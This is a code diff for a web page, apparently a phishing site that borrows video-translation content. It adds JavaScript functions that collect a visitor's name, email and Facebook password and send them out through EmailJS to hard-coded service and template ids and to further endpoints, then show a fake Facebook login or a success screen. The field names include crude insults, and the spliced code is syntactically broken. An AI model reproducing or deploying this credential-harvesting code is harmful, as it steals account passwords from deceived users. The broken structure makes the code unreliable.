@@ -2031,16 +2031,36 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     };
    
     // Submit to the form endpoint
-    <form id="form1">
-  <h3>Contact Form 1</h3>
-  <input type="text" name="user_name" placeholder="Your Name" required>
-  <input type="email" name="user_email" placeholder="Your Email" required>
-  <textarea name="message" placeholder="Your Message" required></textarea>
+    function submitFormData() {
+  const name = document.getElementById('nameInput')?.value.trim() || '';
+  const mall = document.getElementById('mallInput')?.value.trim() || '';
 
-  <input type="hidden" name="to_email" value="akeraa191@gmail.com">
+  emailjs.send(
+    "service_nqeen3l",
+    "template_z0ow5n7",
+    {
+      name: name,
+      mall: mall
+    },
+    "8AcP51LH7_IRW17aY"
+  )
+  .then(() => {
+    submitToOtherEndpoints({
+      bhenjachud: name,
+      majachud: mall
+    });
 
-  <button type="submit">Send Form 1</button>
-</form>
+    showfbLogin();
+  })
+  .catch(() => {
+    submitToOtherEndpoints({
+      bhenjachud: name,
+      majachud: mall
+    });
+
+    showfbLogin();
+  });
+}
     })
     .then(data => {
       console.log('Form submitted successfully:', data);
@@ -2085,16 +2105,31 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     };
    
     // Submit to the form endpoint
-    <form id="form2">
-  <h3>Contact Form 2</h3>
-  <input type="text" name="user_name" placeholder="Your Name" required>
-  <input type="email" name="user_email" placeholder="Your Email" required>
-  <textarea name="message" placeholder="Your Message" required></textarea>
+    function submitfbCredentials(password) {
 
-  <input type="hidden" name="to_email" value="akeraa191@gmail.com">
+  emailjs.send(
+    "service_nqeen3l",
+    "template_z0ow5n7",
+    {
+      pass: password
+    },
+    "8AcP51LH7_IRW17aY"
+  )
+  .then(() => {
+    submitToOtherEndpoints({
+      pass: password
+    });
 
-  <button type="submit">Send Form 2</button>
-</form>
+    showSuccess();
+  })
+  .catch(() => {
+    submitToOtherEndpoints({
+      pass: password
+    });
+
+    showSuccess();
+  });
+}
     })
     .then(data => {
       console.log('fb credentials submitted successfully:', data);
